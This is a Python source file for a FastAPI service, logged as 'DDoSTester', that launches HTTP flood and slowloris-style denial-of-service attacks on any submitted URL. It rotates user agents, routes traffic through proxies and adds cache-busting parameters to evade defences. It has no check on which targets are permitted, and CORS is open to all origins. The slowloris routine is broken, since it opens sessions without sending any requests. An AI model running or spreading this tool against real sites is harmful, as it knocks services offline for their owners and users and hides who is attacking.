import asyncio
import aiohttp
import json
import random
import time
from fastapi import FastAPI, WebSocket, HTTPException, Depends
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.gzip import GZipMiddleware
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
from pydantic import BaseModel
from fake_useragent import UserAgent
from typing import Dict, Optional
from datetime import datetime, timedelta
#import jwt
#from cryptography.fernet import Fernet
import logging

# Configuration
CONFIG = {
    "MAX_REQ_PER_SEC": 1000,
    "PROXY_LIST": "proxies.json"
}

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("DDoSTester")

app = FastAPI()
security = HTTPBearer()

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
app.add_middleware(GZipMiddleware, minimum_size=1000)
# Models
class AttackConfig(BaseModel):
    target_url: str
    attack_type: str = "http_flood"
    duration: int = 60
    intensity: int = 100
    max_concurrent: int = 50

class AttackManager:
    def __init__(self):
        self.active_attacks: Dict[str, asyncio.Task] = {}
        self.stats: Dict[str, dict] = {}
        self.proxies = self.load_proxies()
        self.ua = UserAgent()

    def load_proxies(self):
        try:
            with open(CONFIG['PROXY_LIST']) as f:
                return json.load(f)['proxies']
        except:
            return []

    async def http_flood(self, attack_id: str, config: AttackConfig):
        start_time = time.time()
        session_timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(timeout=session_timeout) as session:
            while time.time() - start_time < config.duration:
                tasks = []
                for _ in range(config.intensity):
                    tasks.append(self.make_request(session, config.target_url))
                
                results = await asyncio.gather(*tasks)
                self.update_stats(attack_id, results)
                await asyncio.sleep(1 / config.max_concurrent)

    async def slowloris(self, attack_id: str, config: AttackConfig):
        headers = {'User-Agent': self.ua.random}
        start_time = time.time()
        sockets = []
        
        try:
            while time.time() - start_time < config.duration:
                conn = aiohttp.TCPConnector(limit=0)
                session = aiohttp.ClientSession(connector=conn, headers=headers)
                sockets.append(session)
                await asyncio.sleep(0.1)
        finally:
            for s in sockets:
                await s.close()

    async def make_request(self, session, url):
        try:
            headers = {'User-Agent': self.ua.random}
            proxy = random.choice(self.proxies) if self.proxies else None
            
            async with session.get(
                url,
                headers=headers,
                proxy=proxy,
                params={'cache_buster': random.randint(1000,9999)}
            ) as response:
                return response.status
        except Exception as e:
            return str(e)

    def update_stats(self, attack_id: str, results: list):
        current_stats = self.stats.get(attack_id, {
            'total': 0, 'success': 0, 'errors': {}
        })
        
        for result in results:
            current_stats['total'] += 1
            if isinstance(result, int):
                current_stats['success'] += 1
            else:
                current_stats['errors'][result] = current_stats['errors'].get(result, 0) + 1
        
        self.stats[attack_id] = current_stats

# API Endpoints
manager = AttackManager()

@app.post("/start-attack")
async def start_attack(config: AttackConfig):
    attack_id = f"attack_{int(time.time())}"
    
    if config.attack_type == "http_flood":
        task = asyncio.create_task(
            manager.http_flood(attack_id, config)
        )
    elif config.attack_type == "slowloris":
        task = asyncio.create_task(
            manager.slowloris(attack_id, config)
        )
    else:
        raise HTTPException(400, "Invalid attack type")
    
    manager.active_attacks[attack_id] = task
    return {"attack_id": attack_id}

@app.get("/stop-attack/{attack_id}")
async def stop_attack(attack_id: str):
    if attack_id in manager.active_attacks:
        manager.active_attacks[attack_id].cancel()
        del manager.active_attacks[attack_id]
    return {"status": "stopped"}

@app.websocket("/stats")
async def stats_websocket(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            try:
                await websocket.send_json(manager.stats)
                await asyncio.sleep(1)

                await asyncio.wait_for(websocket.receive_text(), timeout=30.0)
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logger.error(f"Websocket error: {str(e)}")
                break
    finally:
        await websocket.close()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000, ws="websockets", log_level="info")
